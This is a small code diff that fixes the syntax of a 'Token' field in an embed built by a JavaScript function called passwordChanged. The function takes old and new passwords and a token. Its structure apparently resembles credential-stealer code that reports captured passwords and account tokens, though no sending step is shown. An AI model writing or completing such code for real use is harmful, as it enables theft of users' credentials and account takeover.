@@ -685,9 +685,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: true,
           },
           {
-            name: '**Token**',
-           "value": f'`{token}`
-           "inline": False
+           name: '**Token**',
+           value: `\`${token}\``,
+           inline: false,
           },
         ],
         author: {
